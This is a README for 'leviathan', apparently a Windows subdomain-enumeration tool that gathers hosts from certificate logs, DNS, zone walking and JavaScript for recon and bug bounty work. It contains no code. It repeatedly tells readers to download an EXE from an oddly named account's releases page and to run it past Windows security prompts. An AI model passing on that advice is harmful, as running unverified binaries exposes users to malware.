# leviathan - Find subdomains with less effort

[![Download leviathan](https://img.shields.io/badge/Download%20leviathan-purple?style=for-the-badge&logo=github)](https://github.com/Wireclothshowyladyslipper675/leviathan/releases)

## 🧭 What leviathan does

leviathan helps you find subdomains tied to a domain name. It checks many public sources and DNS paths to build a wider list in less time. You can use it to gather data for security work, bug bounty research, and attack-surface review.

It is built in Rust, so it runs fast and uses few system resources. It can look at passive OSINT sources, DNS records, TLS certificate data, NSEC walking results, reverse DNS, and JavaScript files.

## 💻 Windows setup

leviathan is made for use on Windows through the release files on GitHub. You do not need to build it yourself.

### What you need

- A Windows PC
- A modern web browser
- A target domain name you want to check
- Internet access for the first run

### How to get it

1. Open the release page:
   https://github.com/Wireclothshowyladyslipper675/leviathan/releases
2. Find the latest release at the top of the page
3. Look for a Windows file in the Assets list
4. Download that file to your PC
5. If the file comes as a ZIP, extract it to a folder
6. If the file comes as an EXE, keep it in a folder you can find again

### First launch

1. Open the folder that has the file
2. Double-click the program
3. If Windows shows a security prompt, choose the option to run it
4. A command window should open
5. Keep that window open while the scan runs

## 🧰 How to use it

leviathan works from the command line. That means you type a domain name and it returns results in the window.

A common use looks like this:

1. Open the program
2. Enter the domain you want to check
3. Start the scan
4. Wait for the tool to gather results
5. Review the subdomains it finds

Example target:

- example.com

The tool may collect results from:

- passive DNS sources
- public certificate logs
- DNS record checks
- reverse DNS lookups
- zone walking where allowed
- JavaScript file checks

If the tool saves output to a file, open that file with Notepad or another text editor.

## 🔍 Features

leviathan brings together several checks in one place:

- Passive OSINT lookup
- DNS mining
- TLS SAN harvesting
- NSEC zone walking
- Reverse DNS discovery
- JavaScript analysis
- Fast Rust-based execution
- Low system overhead
- Good fit for repeat recon work

## 📁 Typical output

You may see results like these:

- subdomain names
- DNS points of interest
- host names from certificate data
- hosts found in public JavaScript files
- records that deserve a closer look

The output helps you map the public edge of a domain and spot systems that may not show up in a simple search.

## ⚙️ Suggested use cases

Use leviathan when you need to:

- map a company’s subdomains
- check a bug bounty scope
- review a public attack surface
- compare results from more than one source
- look for forgotten or hidden hosts
- build a list for deeper security review

## 🧭 Simple workflow

1. Download the release from GitHub
2. Open the file on Windows
3. Type the domain you want to inspect
4. Let leviathan gather data
5. Save the results
6. Review the list for names you want to test further

## 🛠️ Troubleshooting

### The file will not open

- Make sure you downloaded the Windows file from the release page
- If the file is in a ZIP, extract it first
- Move the file to a simple folder such as `Downloads` or `Desktop`

### Windows blocks the program

- Check whether the file came from a trusted release asset
- Right-click the file and open it again
- If Windows shows a security prompt, choose to run it

### No results appear

- Check that your PC has internet access
- Try a different domain name
- Make sure the target has public DNS data or public records to query

### The window closes too fast

- Run the program from a command prompt so you can read the output
- If needed, add a pause in your workflow by opening the tool from an existing terminal window

## 📌 Release download

Visit this page to download leviathan for Windows:

https://github.com/Wireclothshowyladyslipper675/leviathan/releases

## 🔐 Before you use it

Use leviathan only on domains you own or have permission to test. It can reveal public host names and related data, so treat the output as sensitive security information.

## 🧩 Built for

- Windows users who want a simple recon tool
- bug bounty work
- security review
- asset discovery
- subdomain enumeration
- attack-surface mapping

## 🖥️ File types you may see

The release page may include one of these:

- `.exe` for direct use
- `.zip` for a folder with the app inside
- support files with release notes or checksums

If you are not sure which file to pick, choose the Windows asset that matches your system and use the newest release

## 📚 What leviathan checks

leviathan may pull data from:

- public search sources
- DNS records
- certificate transparency logs
- name server behavior
- reverse DNS maps
- JavaScript references on public pages

That mix helps it find names that are hard to spot with one method alone

## 🧪 Best results

For clean results:

- use a single root domain
- run one target at a time
- keep a note of what you test
- save the output after each run
- review the final list by hand

## 📎 Quick start

1. Go to the release page
2. Download the latest Windows file
3. Open the file on your PC
4. Enter a domain name
5. Read the subdomain list
6. Save the output for later review